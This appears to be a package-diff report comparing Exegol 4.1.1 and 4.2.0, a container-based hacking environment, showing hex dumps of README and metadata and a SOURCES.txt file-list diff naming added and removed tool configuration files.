+00001080: 2028 4c69 6e50 4541 532c 2057 696e 5045   (LinPEAS, WinPE
+00001090: 4153 2c20 4c69 6e45 6e75 6d2c 2050 7269  AS, LinEnum, Pri
+000010a0: 7665 7363 4368 6563 6b2c 2053 7973 696e  vescCheck, Sysin
+000010b0: 7465 726e 616c 7353 7569 7465 2c20 6d69  ternalsSuite, mi
+000010c0: 6d69 6b61 747a 2c20 5275 6265 7573 2c20  mikatz, Rubeus, 
+000010d0: 506f 7765 7253 706c 6f69 7420 616e 6420  PowerSploit and 
+000010e0: 6d61 6e79 206d 6f72 652e 292e 0a2d 2054  many more.)..- T
+000010f0: 6865 205b 4578 6567 6f6c 2d64 6f63 735d  he [Exegol-docs]
+00001100: 2868 7474 7073 3a2f 2f67 6974 6875 622e  (https://github.
+00001110: 636f 6d2f 5468 6550 6f72 6773 2f45 7865  com/ThePorgs/Exe
+00001120: 676f 6c2d 646f 6373 2920 7265 706f 2066  gol-docs) repo f
+00001130: 6f72 2074 6865 2064 6f63 756d 656e 7461  or the documenta
+00001140: 7469 6f6e 2c20 6465 7374 696e 6564 2066  tion, destined f
+00001150: 6f72 2075 7365 7273 2061 7320 7765 6c6c  or users as well
+00001160: 2061 7320 6465 7665 6c6f 7070 6572 7320   as developpers 
+00001170: 616e 6420 636f 6e74 7269 6275 746f 7273  and contributors
+00001180: 2e20 5468 6520 4769 7448 7562 2072 6570  . The GitHub rep
+00001190: 6f20 686f 6c64 7320 7468 6520 736f 7572  o holds the sour
+000011a0: 6365 7320 7468 6174 2061 7265 2063 6f6d  ces that are com
+000011b0: 7069 6c65 6420 6f6e 2068 7474 7073 3a2f  piled on https:/
+000011c0: 2f65 7865 676f 6c2e 7265 6164 7468 6564  /exegol.readthed
+000011d0: 6f63 732e 696f 2f2e 0a0a 2320 5370 6f6e  ocs.io/...# Spon
+000011e0: 736f 7273 0a0a 3c64 6976 2061 6c69 676e  sors..<div align
+000011f0: 3d22 6365 6e74 6572 223e 0a20 203c 6120  ="center">.  <a 
+00001200: 6872 6566 3d22 6874 7470 733a 2f2f 7777  href="https://ww
+00001210: 772e 6361 7067 656d 696e 692e 636f 6d2f  w.capgemini.com/
+00001220: 2220 7469 746c 653d 2246 6f6c 6c6f 7722  " title="Follow"
+00001230: 3e0a 2020 2020 3c69 6d67 2077 6964 7468  >.    <img width
+00001240: 3d22 3330 3022 2073 7263 3d22 6874 7470  ="300" src="http
+00001250: 733a 2f2f 7570 6c6f 6164 2e77 696b 696d  s://upload.wikim
+00001260: 6564 6961 2e6f 7267 2f77 696b 6970 6564  edia.org/wikiped
+00001270: 6961 2f66 722f 7468 756d 622f 622f 6235  ia/fr/thumb/b/b5
+00001280: 2f43 6170 6765 6d69 6e69 5f4c 6f67 6f2e  /Capgemini_Logo.
+00001290: 7376 672f 3132 3830 7078 2d43 6170 6765  svg/1280px-Capge
+000012a0: 6d69 6e69 5f4c 6f67 6f2e 7376 672e 706e  mini_Logo.svg.pn
+000012b0: 6722 3e0a 2020 3c2f 613e 0a3c 2f64 6976  g">.  </a>.</div
+000012c0: 3e0a 0a44 7261 6d65 6c61 6320 616e 6420  >..Dramelac and 
+000012d0: 4920 776f 726b 2061 7420 2a43 6170 6765  I work at *Capge
+000012e0: 6d69 6e69 2a20 616e 6420 7765 2074 6861  mini* and we tha
+000012f0: 6e6b 2074 6865 6d20 666f 7220 616c 6c6f  nk them for allo
+00001300: 6361 7469 6e67 2073 6f6d 6520 7469 6d65  cating some time
+00001310: 2066 6f72 2075 7320 746f 2064 6576 656c   for us to devel
+00001320: 6f70 2061 6e64 206d 6169 6e74 6169 6e20  op and maintain 
+00001330: 4578 6567 6f6c 2120 5669 7369 7420 4361  Exegol! Visit Ca
+00001340: 7067 656d 696e 6920 7765 6273 6974 6520  pgemini website 
+00001350: 6174 2068 7474 7073 3a2f 2f77 7777 2e63  at https://www.c
+00001360: 6170 6765 6d69 6e69 2e63 6f6d 2f2e 0a0a  apgemini.com/...
+00001370: 5f5f 5f0a 0a3c 6469 7620 616c 6967 6e3d  ___..<div align=
+00001380: 2263 656e 7465 7222 3e0a 2020 3c61 2068  "center">.  <a h
+00001390: 7265 663d 2268 7474 7073 3a2f 2f77 7777  ref="https://www
+000013a0: 2e68 6163 6b74 6865 626f 782e 636f 6d2f  .hackthebox.com/
+000013b0: 2220 7469 746c 653d 2246 6f6c 6c6f 7722  " title="Follow"
+000013c0: 3e0a 2020 2020 3c69 6d67 2077 6964 7468  >.    <img width
+000013d0: 3d22 3330 3022 2073 7263 3d22 6874 7470  ="300" src="http
+000013e0: 733a 2f2f 6578 6567 6f6c 2e72 6561 6474  s://exegol.readt
+000013f0: 6865 646f 6373 2e69 6f2f 656e 2f6c 6174  hedocs.io/en/lat
+00001400: 6573 742f 5f69 6d61 6765 732f 6861 636b  est/_images/hack
+00001410: 7468 6562 6f78 2e70 6e67 223e 0a20 203c  thebox.png">.  <
+00001420: 2f61 3e0a 3c2f 6469 763e 0a0a 5765 2061  /a>.</div>..We a
+00001430: 6c73 6f20 7468 616e 6b20 2a48 6163 6b54  lso thank *HackT
+00001440: 6865 426f 782a 2066 6f72 2063 6f6e 7469  heBox* for conti
+00001450: 6e75 6f75 736c 7920 7375 7070 6f72 7469  nuously supporti
+00001460: 6e67 2074 6865 2063 6f6d 6d75 6e69 7479  ng the community
+00001470: 2061 6e64 2066 6f72 2068 656c 7069 6e67   and for helping
+00001480: 2075 7320 6669 6e61 6e63 6961 6c6c 7920   us financially 
+00001490: 746f 2061 6371 7569 7265 2074 6865 206e  to acquire the n
+000014a0: 6563 6573 7361 7279 2068 6172 6477 6172  ecessary hardwar
+000014b0: 6520 666f 7220 7375 7070 6f72 7469 6e67  e for supporting
+000014c0: 206d 756c 7469 706c 6520 6172 6368 6974   multiple archit
+000014d0: 6563 7475 7265 7320 2841 4d44 3634 2c20  ectures (AMD64, 
+000014e0: 4152 4d36 3429 2e20 5368 6f77 2073 6f6d  ARM64). Show som
+000014f0: 6520 6c6f 7665 2061 7420 6874 7470 733a  e love at https:
+00001500: 2f2f 7777 772e 6861 636b 7468 6562 6f78  //www.hackthebox
+00001510: 2e63 6f6d 2f20 210a 0a                   .com/ !..
```

### Comparing `Exegol-4.1.1/Exegol.egg-info/SOURCES.txt` & `Exegol-4.2.0/Exegol.egg-info/SOURCES.txt`

 * *Files 2% similar despite different names*

```diff
@@ -8,37 +8,40 @@
 Exegol.egg-info/requires.txt
 Exegol.egg-info/top_level.txt
 exegol/__init__.py
 exegol/__main__.py
 exegol-docker-build/Dockerfile
 exegol-docker-build/ad.dockerfile
 exegol-docker-build/debug.dockerfile
-exegol-docker-build/dev.dockerfile
 exegol-docker-build/light.dockerfile
 exegol-docker-build/osint.dockerfile
-exegol-docker-build/test.dockerfile
 exegol-docker-build/web.dockerfile
 exegol-docker-build/sources/install.sh
 exegol-docker-build/sources/bloodhound/config.json
 exegol-docker-build/sources/bloodhound/customqueries.json
 exegol-docker-build/sources/crackmapexec/cme.conf
 exegol-docker-build/sources/exegol/entrypoint.sh
 exegol-docker-build/sources/exegol/load_supported_setups.sh
 exegol-docker-build/sources/exegol/start.sh
-exegol-docker-build/sources/exegol/build_pipeline_tests/ingest_tests.py
+exegol-docker-build/sources/exegol/build_pipeline_tests/run_tests.py
 exegol-docker-build/sources/exegol/skel/README.md
 exegol-docker-build/sources/exegol/skel/load_user_setup.sh
 exegol-docker-build/sources/exegol/skel/supported_setups.md
 exegol-docker-build/sources/exegol/skel/apt/keys.list
 exegol-docker-build/sources/exegol/skel/apt/packages.list
 exegol-docker-build/sources/exegol/skel/apt/sources.list
+exegol-docker-build/sources/exegol/skel/firefox/addons.txt
 exegol-docker-build/sources/exegol/skel/python3/requirements.txt
 exegol-docker-build/sources/exegol/skel/zsh/aliases
 exegol-docker-build/sources/exegol/skel/zsh/history
 exegol-docker-build/sources/exegol/skel/zsh/zshrc
+exegol-docker-build/sources/firefox/places.sqlite
+exegol-docker-build/sources/firefox/requirements.txt
+exegol-docker-build/sources/firefox/setup.py
+exegol-docker-build/sources/firefox/user-setup.py
 exegol-docker-build/sources/grc/conf.cme
 exegol-docker-build/sources/grc/conf.describeTicket
 exegol-docker-build/sources/grc/conf.getgpppassword
 exegol-docker-build/sources/grc/conf.krbrelayx
 exegol-docker-build/sources/grc/conf.ntlmrelayx
 exegol-docker-build/sources/grc/conf.rbcd
 exegol-docker-build/sources/grc/conf.secretsdump
@@ -50,24 +53,24 @@
 exegol-docker-build/sources/trilium/config.ini
 exegol-docker-build/sources/trilium/document.db
 exegol-docker-build/sources/trilium/document.db-shm
 exegol-docker-build/sources/trilium/document.db-wal
 exegol-docker-build/sources/zsh/aliases
 exegol-docker-build/sources/zsh/history
 exegol-docker-build/sources/zsh/zshrc
+exegol-docker-build/sources/zsh/aliases.d/PassTheCert
 exegol-docker-build/sources/zsh/aliases.d/aircrack-ng
 exegol-docker-build/sources/zsh/aliases.d/arsenal
 exegol-docker-build/sources/zsh/aliases.d/bettercap
 exegol-docker-build/sources/zsh/aliases.d/blazy
 exegol-docker-build/sources/zsh/aliases.d/bloodhound
 exegol-docker-build/sources/zsh/aliases.d/bloodhound-py
 exegol-docker-build/sources/zsh/aliases.d/bloodhound-quickwin
 exegol-docker-build/sources/zsh/aliases.d/bolt
 exegol-docker-build/sources/zsh/aliases.d/burpsuite
-exegol-docker-build/sources/zsh/aliases.d/byp4xx
 exegol-docker-build/sources/zsh/aliases.d/carbon14
 exegol-docker-build/sources/zsh/aliases.d/cloudfail
 exegol-docker-build/sources/zsh/aliases.d/corscanner
 exegol-docker-build/sources/zsh/aliases.d/crackhound
 exegol-docker-build/sources/zsh/aliases.d/crackmapexec
 exegol-docker-build/sources/zsh/aliases.d/cypheroth
 exegol-docker-build/sources/zsh/aliases.d/darkarmour
@@ -99,41 +102,45 @@
 exegol-docker-build/sources/zsh/aliases.d/infoga
 exegol-docker-build/sources/zsh/aliases.d/jd-gui
 exegol-docker-build/sources/zsh/aliases.d/jdwp-shellifier
 exegol-docker-build/sources/zsh/aliases.d/john-the-ripper
 exegol-docker-build/sources/zsh/aliases.d/joomscan
 exegol-docker-build/sources/zsh/aliases.d/jwt_tool
 exegol-docker-build/sources/zsh/aliases.d/kadimus
+exegol-docker-build/sources/zsh/aliases.d/kraken
 exegol-docker-build/sources/zsh/aliases.d/krbrelayx
 exegol-docker-build/sources/zsh/aliases.d/ldaprelayscan
 exegol-docker-build/sources/zsh/aliases.d/ldapsearch-ad
 exegol-docker-build/sources/zsh/aliases.d/libmspack
 exegol-docker-build/sources/zsh/aliases.d/libnfc-crypto1-crack
 exegol-docker-build/sources/zsh/aliases.d/linkedin2username
 exegol-docker-build/sources/zsh/aliases.d/linkfinder
 exegol-docker-build/sources/zsh/aliases.d/lnkup
 exegol-docker-build/sources/zsh/aliases.d/mfdread
 exegol-docker-build/sources/zsh/aliases.d/moodlescan
 exegol-docker-build/sources/zsh/aliases.d/mousejack
+exegol-docker-build/sources/zsh/aliases.d/neo4j
 exegol-docker-build/sources/zsh/aliases.d/nmap
 exegol-docker-build/sources/zsh/aliases.d/nosqlmap
 exegol-docker-build/sources/zsh/aliases.d/ntlmv1-multi
 exegol-docker-build/sources/zsh/aliases.d/oaburl
 exegol-docker-build/sources/zsh/aliases.d/oneforall
 exegol-docker-build/sources/zsh/aliases.d/pcredz
 exegol-docker-build/sources/zsh/aliases.d/petitpotam
 exegol-docker-build/sources/zsh/aliases.d/photon
 exegol-docker-build/sources/zsh/aliases.d/php
+exegol-docker-build/sources/zsh/aliases.d/php_filter_chain_generator
 exegol-docker-build/sources/zsh/aliases.d/phpggc
 exegol-docker-build/sources/zsh/aliases.d/pkinittools
 exegol-docker-build/sources/zsh/aliases.d/polenum
 exegol-docker-build/sources/zsh/aliases.d/powershell
 exegol-docker-build/sources/zsh/aliases.d/privexchange
 exegol-docker-build/sources/zsh/aliases.d/proxmark3
 exegol-docker-build/sources/zsh/aliases.d/proxychains
+exegol-docker-build/sources/zsh/aliases.d/pth-tools
 exegol-docker-build/sources/zsh/aliases.d/pwndb
 exegol-docker-build/sources/zsh/aliases.d/pwnedornot
 exegol-docker-build/sources/zsh/aliases.d/pyftpdlib
 exegol-docker-build/sources/zsh/aliases.d/pygpoabuse
 exegol-docker-build/sources/zsh/aliases.d/pykek
 exegol-docker-build/sources/zsh/aliases.d/pylaps
 exegol-docker-build/sources/zsh/aliases.d/python3
@@ -143,99 +150,115 @@
 exegol-docker-build/sources/zsh/aliases.d/responder
 exegol-docker-build/sources/zsh/aliases.d/routersploit
 exegol-docker-build/sources/zsh/aliases.d/rsactftool
 exegol-docker-build/sources/zsh/aliases.d/shadowcoerce
 exegol-docker-build/sources/zsh/aliases.d/simplyemail
 exegol-docker-build/sources/zsh/aliases.d/smali
 exegol-docker-build/sources/zsh/aliases.d/smbmap
+exegol-docker-build/sources/zsh/aliases.d/smuggler
+exegol-docker-build/sources/zsh/aliases.d/soapui
 exegol-docker-build/sources/zsh/aliases.d/spiderfoot
 exegol-docker-build/sources/zsh/aliases.d/ssrfmap
 exegol-docker-build/sources/zsh/aliases.d/starkiller
 exegol-docker-build/sources/zsh/aliases.d/symfony-exploits
+exegol-docker-build/sources/zsh/aliases.d/tailscale
 exegol-docker-build/sources/zsh/aliases.d/targetedkerberoast
 exegol-docker-build/sources/zsh/aliases.d/testssl
 exegol-docker-build/sources/zsh/aliases.d/theharvester
 exegol-docker-build/sources/zsh/aliases.d/tls-scanner
 exegol-docker-build/sources/zsh/aliases.d/tomcatwardeployer
 exegol-docker-build/sources/zsh/aliases.d/toutatis
 exegol-docker-build/sources/zsh/aliases.d/trid
 exegol-docker-build/sources/zsh/aliases.d/trilium
 exegol-docker-build/sources/zsh/aliases.d/username-anarchy
-exegol-docker-build/sources/zsh/aliases.d/volatility
+exegol-docker-build/sources/zsh/aliases.d/volatility2
+exegol-docker-build/sources/zsh/aliases.d/volatility3
 exegol-docker-build/sources/zsh/aliases.d/vulny-code-static-analysis
 exegol-docker-build/sources/zsh/aliases.d/xmllint
 exegol-docker-build/sources/zsh/aliases.d/xsel
 exegol-docker-build/sources/zsh/aliases.d/xsstrike
 exegol-docker-build/sources/zsh/aliases.d/ysoserial
 exegol-docker-build/sources/zsh/aliases.d/zerologon
 exegol-docker-build/sources/zsh/history.d/adidnsdump
 exegol-docker-build/sources/zsh/history.d/aircrack-ng
 exegol-docker-build/sources/zsh/history.d/amber
 exegol-docker-build/sources/zsh/history.d/assetfinder
 exegol-docker-build/sources/zsh/history.d/autorecon
 exegol-docker-build/sources/zsh/history.d/bloodhound-import
 exegol-docker-build/sources/zsh/history.d/bloodhound-py
 exegol-docker-build/sources/zsh/history.d/bloodhound-quickwin
+exegol-docker-build/sources/zsh/history.d/bqm
+exegol-docker-build/sources/zsh/history.d/brakeman
 exegol-docker-build/sources/zsh/history.d/buster
 exegol-docker-build/sources/zsh/history.d/carbon14
 exegol-docker-build/sources/zsh/history.d/certipy
 exegol-docker-build/sources/zsh/history.d/cewl
 exegol-docker-build/sources/zsh/history.d/cloudfail
 exegol-docker-build/sources/zsh/history.d/clusterd
 exegol-docker-build/sources/zsh/history.d/cmsmap
 exegol-docker-build/sources/zsh/history.d/coercer
 exegol-docker-build/sources/zsh/history.d/crackhound
 exegol-docker-build/sources/zsh/history.d/crackmapexec
+exegol-docker-build/sources/zsh/history.d/ctf-party
 exegol-docker-build/sources/zsh/history.d/curl
 exegol-docker-build/sources/zsh/history.d/cypheroth
 exegol-docker-build/sources/zsh/history.d/darkarmour
 exegol-docker-build/sources/zsh/history.d/dfscoerce
 exegol-docker-build/sources/zsh/history.d/dirb
 exegol-docker-build/sources/zsh/history.d/dirsearch
 exegol-docker-build/sources/zsh/history.d/divideandscan
 exegol-docker-build/sources/zsh/history.d/dnsutils
+exegol-docker-build/sources/zsh/history.d/dnsx
 exegol-docker-build/sources/zsh/history.d/donpapi
 exegol-docker-build/sources/zsh/history.d/enum4linux-ng
 exegol-docker-build/sources/zsh/history.d/enyx
 exegol-docker-build/sources/zsh/history.d/evil-winrm
+exegol-docker-build/sources/zsh/history.d/exif
+exegol-docker-build/sources/zsh/history.d/exiv2
 exegol-docker-build/sources/zsh/history.d/faketime
 exegol-docker-build/sources/zsh/history.d/fcrackzip
+exegol-docker-build/sources/zsh/history.d/fdisk
 exegol-docker-build/sources/zsh/history.d/feroxbuster
 exegol-docker-build/sources/zsh/history.d/ffuf
 exegol-docker-build/sources/zsh/history.d/fierce
 exegol-docker-build/sources/zsh/history.d/finduncommonshares
 exegol-docker-build/sources/zsh/history.d/github-email
 exegol-docker-build/sources/zsh/history.d/gmsadumper
 exegol-docker-build/sources/zsh/history.d/gobuster
 exegol-docker-build/sources/zsh/history.d/goldencopy
 exegol-docker-build/sources/zsh/history.d/gosecretsdump
 exegol-docker-build/sources/zsh/history.d/goshs
 exegol-docker-build/sources/zsh/history.d/gowitness
 exegol-docker-build/sources/zsh/history.d/h8mail
+exegol-docker-build/sources/zsh/history.d/haiti
 exegol-docker-build/sources/zsh/history.d/hakrawler
 exegol-docker-build/sources/zsh/history.d/hakrevdns
 exegol-docker-build/sources/zsh/history.d/hashcat
 exegol-docker-build/sources/zsh/history.d/hcxdumptool
 exegol-docker-build/sources/zsh/history.d/hcxtools
+exegol-docker-build/sources/zsh/history.d/hexedit
 exegol-docker-build/sources/zsh/history.d/holehe
 exegol-docker-build/sources/zsh/history.d/httpmethods
 exegol-docker-build/sources/zsh/history.d/httpx
 exegol-docker-build/sources/zsh/history.d/impacket
 exegol-docker-build/sources/zsh/history.d/infoga
 exegol-docker-build/sources/zsh/history.d/ipinfo
 exegol-docker-build/sources/zsh/history.d/jackit
+exegol-docker-build/sources/zsh/history.d/jadx
 exegol-docker-build/sources/zsh/history.d/john-the-ripper
 exegol-docker-build/sources/zsh/history.d/kadimus
 exegol-docker-build/sources/zsh/history.d/kerbrute
 exegol-docker-build/sources/zsh/history.d/kiterunner
+exegol-docker-build/sources/zsh/history.d/kraken
 exegol-docker-build/sources/zsh/history.d/krbrelayx
 exegol-docker-build/sources/zsh/history.d/ldapdomaindump
 exegol-docker-build/sources/zsh/history.d/ldaprelayscan
 exegol-docker-build/sources/zsh/history.d/ldapsearch
 exegol-docker-build/sources/zsh/history.d/ldapsearch-ad
+exegol-docker-build/sources/zsh/history.d/ldeep
 exegol-docker-build/sources/zsh/history.d/libnfc
 exegol-docker-build/sources/zsh/history.d/libnfc-crypto1-crack
 exegol-docker-build/sources/zsh/history.d/linkedin2username
 exegol-docker-build/sources/zsh/history.d/lnkup
 exegol-docker-build/sources/zsh/history.d/lsassy
 exegol-docker-build/sources/zsh/history.d/maigret
 exegol-docker-build/sources/zsh/history.d/manspider
@@ -244,20 +267,23 @@
 exegol-docker-build/sources/zsh/history.d/mfoc
 exegol-docker-build/sources/zsh/history.d/mitm6
 exegol-docker-build/sources/zsh/history.d/moodlescan
 exegol-docker-build/sources/zsh/history.d/mousejack
 exegol-docker-build/sources/zsh/history.d/name-that-hash
 exegol-docker-build/sources/zsh/history.d/nbtscan
 exegol-docker-build/sources/zsh/history.d/neo4j
+exegol-docker-build/sources/zsh/history.d/netdiscover
 exegol-docker-build/sources/zsh/history.d/ngrok
 exegol-docker-build/sources/zsh/history.d/nmap
+exegol-docker-build/sources/zsh/history.d/notify
 exegol-docker-build/sources/zsh/history.d/ntlmv1-multi
 exegol-docker-build/sources/zsh/history.d/ntpdate
 exegol-docker-build/sources/zsh/history.d/nuclei
 exegol-docker-build/sources/zsh/history.d/oaburl
+exegol-docker-build/sources/zsh/history.d/objection
 exegol-docker-build/sources/zsh/history.d/onesixtyone
 exegol-docker-build/sources/zsh/history.d/pass-station
 exegol-docker-build/sources/zsh/history.d/petitpotam
 exegol-docker-build/sources/zsh/history.d/phoneinfoga
 exegol-docker-build/sources/zsh/history.d/pkinittools
 exegol-docker-build/sources/zsh/history.d/polenum
 exegol-docker-build/sources/zsh/history.d/prips
@@ -270,76 +296,91 @@
 exegol-docker-build/sources/zsh/history.d/pypykatz
 exegol-docker-build/sources/zsh/history.d/pywhisker
 exegol-docker-build/sources/zsh/history.d/pywsus
 exegol-docker-build/sources/zsh/history.d/responder
 exegol-docker-build/sources/zsh/history.d/rlwrap
 exegol-docker-build/sources/zsh/history.d/robotstester
 exegol-docker-build/sources/zsh/history.d/ruler
+exegol-docker-build/sources/zsh/history.d/rusthound
 exegol-docker-build/sources/zsh/history.d/samba
+exegol-docker-build/sources/zsh/history.d/semgrep
 exegol-docker-build/sources/zsh/history.d/shadowcoerce
 exegol-docker-build/sources/zsh/history.d/shellerator
+exegol-docker-build/sources/zsh/history.d/shuffledns
 exegol-docker-build/sources/zsh/history.d/simplyemail
 exegol-docker-build/sources/zsh/history.d/smartbrute
 exegol-docker-build/sources/zsh/history.d/smbclient
 exegol-docker-build/sources/zsh/history.d/smbmap
 exegol-docker-build/sources/zsh/history.d/smtp-user-enum
+exegol-docker-build/sources/zsh/history.d/smuggler
 exegol-docker-build/sources/zsh/history.d/snmp
 exegol-docker-build/sources/zsh/history.d/spiderfoot
 exegol-docker-build/sources/zsh/history.d/sprayhound
 exegol-docker-build/sources/zsh/history.d/sqlmap
 exegol-docker-build/sources/zsh/history.d/ssh
 exegol-docker-build/sources/zsh/history.d/sslyze
 exegol-docker-build/sources/zsh/history.d/subfinder
 exegol-docker-build/sources/zsh/history.d/sublist3r
+exegol-docker-build/sources/zsh/history.d/swaks
+exegol-docker-build/sources/zsh/history.d/tailscale
 exegol-docker-build/sources/zsh/history.d/targetedkerberoast
+exegol-docker-build/sources/zsh/history.d/testdisk
 exegol-docker-build/sources/zsh/history.d/theharvester
+exegol-docker-build/sources/zsh/history.d/tls-map
 exegol-docker-build/sources/zsh/history.d/tls-scanner
 exegol-docker-build/sources/zsh/history.d/toutatis
 exegol-docker-build/sources/zsh/history.d/twint
 exegol-docker-build/sources/zsh/history.d/updog
+exegol-docker-build/sources/zsh/history.d/volatility3
 exegol-docker-build/sources/zsh/history.d/waybackurls
 exegol-docker-build/sources/zsh/history.d/webclientservicescanner
 exegol-docker-build/sources/zsh/history.d/wfuzz
 exegol-docker-build/sources/zsh/history.d/whatportis
 exegol-docker-build/sources/zsh/history.d/windapsearch
 exegol-docker-build/sources/zsh/history.d/wpscan
 exegol-docker-build/sources/zsh/history.d/xfreerdp
 exegol-docker-build/sources/zsh/history.d/zerologon
+exegol/config/ConstantConfig.py
+exegol/config/DataCache.py
+exegol/config/EnvInfo.py
+exegol/config/UserConfig.py
+exegol/config/__init__.py
 exegol/console/ConsoleFormat.py
-exegol/console/ExegolBox.py
 exegol/console/ExegolProgress.py
 exegol/console/ExegolPrompt.py
 exegol/console/LayerTextColumn.py
+exegol/console/MetaGitProgress.py
 exegol/console/TUI.py
 exegol/console/__init__.py
+exegol/console/cli/ExegolCompleter.py
 exegol/console/cli/ParametersManager.py
 exegol/console/cli/__init__.py
 exegol/console/cli/actions/Command.py
 exegol/console/cli/actions/ExegolParameters.py
 exegol/console/cli/actions/GenericParameters.py
 exegol/console/cli/actions/__init__.py
 exegol/exceptions/ExegolExceptions.py
 exegol/exceptions/__init__.py
 exegol/manager/ExegolController.py
 exegol/manager/ExegolManager.py
 exegol/manager/UpdateManager.py
 exegol/manager/__init__.py
+exegol/model/CacheModels.py
 exegol/model/ContainerConfig.py
 exegol/model/ExegolContainer.py
 exegol/model/ExegolContainerTemplate.py
 exegol/model/ExegolImage.py
 exegol/model/ExegolModules.py
 exegol/model/MetaImages.py
 exegol/model/SelectableInterface.py
 exegol/model/__init__.py
-exegol/utils/ConstantConfig.py
+exegol/utils/DataFileUtils.py
 exegol/utils/DockerUtils.py
-exegol/utils/EnvInfo.py
 exegol/utils/ExeLog.py
 exegol/utils/FsUtils.py
 exegol/utils/GitUtils.py
 exegol/utils/GuiUtils.py
 exegol/utils/MetaSingleton.py
-exegol/utils/UserConfig.py
 exegol/utils/WebUtils.py
 exegol/utils/__init__.py
-exegol/utils/argParse.py
+exegol/utils/argParse.py
+tests/test_exegol.py
```

### Comparing `Exegol-4.1.1/LICENSE` & `Exegol-4.2.0/LICENSE`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/PKG-INFO` & `Exegol-4.2.0/Exegol.egg-info/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 00000000: 4d65 7461 6461 7461 2d56 6572 7369 6f6e  Metadata-Version
 00000010: 3a20 322e 310a 4e61 6d65 3a20 4578 6567  : 2.1.Name: Exeg
-00000020: 6f6c 0a56 6572 7369 6f6e 3a20 342e 312e  ol.Version: 4.1.
-00000030: 310a 5375 6d6d 6172 793a 2050 7974 686f  1.Summary: Pytho
+00000020: 6f6c 0a56 6572 7369 6f6e 3a20 342e 322e  ol.Version: 4.2.
+00000030: 300a 5375 6d6d 6172 793a 2050 7974 686f  0.Summary: Pytho
 00000040: 6e20 7772 6170 7065 7220 746f 2075 7365  n wrapper to use
 00000050: 2045 7865 676f 6c2c 2061 2063 6f6e 7461   Exegol, a conta
 00000060: 696e 6572 2062 6173 6564 2066 756c 6c79  iner based fully
 00000070: 2066 6561 7475 7265 6420 616e 6420 636f   featured and co
 00000080: 6d6d 756e 6974 792d 6472 6976 656e 2068  mmunity-driven h
 00000090: 6163 6b69 6e67 2065 6e76 6972 6f6e 6d65  acking environme
 000000a0: 6e74 2e0a 486f 6d65 2d70 6167 653a 2068  nt..Home-page: h
@@ -45,303 +45,362 @@
 000002c0: 686f 6e20 3a3a 2033 2e38 0a43 6c61 7373  hon :: 3.8.Class
 000002d0: 6966 6965 723a 2050 726f 6772 616d 6d69  ifier: Programmi
 000002e0: 6e67 204c 616e 6775 6167 6520 3a3a 2050  ng Language :: P
 000002f0: 7974 686f 6e20 3a3a 2033 2e39 0a43 6c61  ython :: 3.9.Cla
 00000300: 7373 6966 6965 723a 2050 726f 6772 616d  ssifier: Program
 00000310: 6d69 6e67 204c 616e 6775 6167 6520 3a3a  ming Language ::
 00000320: 2050 7974 686f 6e20 3a3a 2033 2e31 300a   Python :: 3.10.
-00000330: 436c 6173 7369 6669 6572 3a20 4c69 6365  Classifier: Lice
-00000340: 6e73 6520 3a3a 204f 5349 2041 7070 726f  nse :: OSI Appro
-00000350: 7665 6420 3a3a 2047 4e55 2047 656e 6572  ved :: GNU Gener
-00000360: 616c 2050 7562 6c69 6320 4c69 6365 6e73  al Public Licens
-00000370: 6520 7633 2028 4750 4c76 3329 0a43 6c61  e v3 (GPLv3).Cla
-00000380: 7373 6966 6965 723a 204f 7065 7261 7469  ssifier: Operati
-00000390: 6e67 2053 7973 7465 6d20 3a3a 204f 5320  ng System :: OS 
-000003a0: 496e 6465 7065 6e64 656e 740a 5265 7175  Independent.Requ
-000003b0: 6972 6573 2d50 7974 686f 6e3a 203e 3d33  ires-Python: >=3
-000003c0: 2e37 2c20 3c34 0a44 6573 6372 6970 7469  .7, <4.Descripti
-000003d0: 6f6e 2d43 6f6e 7465 6e74 2d54 7970 653a  on-Content-Type:
-000003e0: 2074 6578 742f 6d61 726b 646f 776e 0a4c   text/markdown.L
-000003f0: 6963 656e 7365 2d46 696c 653a 204c 4943  icense-File: LIC
-00000400: 454e 5345 0a0a 3c64 6976 2061 6c69 676e  ENSE..<div align
-00000410: 3d22 6365 6e74 6572 223e 0a20 203c 696d  ="center">.  <im
-00000420: 6720 616c 743d 2265 7865 676f 6c20 6c6f  g alt="exegol lo
-00000430: 676f 2220 7769 6474 683d 2236 3030 2220  go" width="600" 
-00000440: 7372 633d 2268 7474 7073 3a2f 2f72 6177  src="https://raw
-00000450: 2e67 6974 6875 6275 7365 7263 6f6e 7465  .githubuserconte
-00000460: 6e74 2e63 6f6d 2f54 6865 506f 7267 732f  nt.com/ThePorgs/
-00000470: 4578 6567 6f6c 2d64 6f63 732f 6d61 696e  Exegol-docs/main
-00000480: 2f2e 6173 7365 7473 2f72 6f75 6e64 6564  /.assets/rounded
-00000490: 5f73 6f63 6961 6c5f 7072 6576 6965 772e  _social_preview.
-000004a0: 706e 6722 3e0a 2020 3c62 723e 3c62 723e  png">.  <br><br>
-000004b0: 0a20 203c 6120 6872 6566 3d22 6874 7470  .  <a href="http
-000004c0: 733a 2f2f 7079 7069 2e6f 7267 2f70 726f  s://pypi.org/pro
-000004d0: 6a65 6374 2f45 7865 676f 6c22 2074 6974  ject/Exegol" tit
-000004e0: 6c65 3d22 223e 3c69 6d67 2073 7263 3d22  le=""><img src="
-000004f0: 6874 7470 733a 2f2f 696d 672e 7368 6965  https://img.shie
-00000500: 6c64 732e 696f 2f70 7970 692f 762f 4578  lds.io/pypi/v/Ex
-00000510: 6567 6f6c 3f63 6f6c 6f72 3d69 6e66 6f72  egol?color=infor
-00000520: 6d61 7469 6f6e 616c 2220 616c 743d 2270  mational" alt="p
-00000530: 6970 2070 6163 6b61 6765 2076 6572 7369  ip package versi
-00000540: 6f6e 223e 3c2f 613e 0a20 203c 696d 6720  on"></a>.  <img 
-00000550: 616c 743d 2250 7974 686f 6e33 2e37 2220  alt="Python3.7" 
-00000560: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
-00000570: 2e73 6869 656c 6473 2e69 6f2f 6261 6467  .shields.io/badg
-00000580: 652f 5079 7468 6f6e 2d33 2e37 2b2d 696e  e/Python-3.7+-in
-00000590: 666f 726d 6174 696f 6e61 6c22 3e0a 2020  formational">.  
-000005a0: 3c61 2068 7265 663d 2268 7474 7073 3a2f  <a href="https:/
-000005b0: 2f70 6570 792e 7465 6368 2f70 726f 6a65  /pepy.tech/proje
-000005c0: 6374 2f65 7865 676f 6c22 2074 6974 6c65  ct/exegol" title
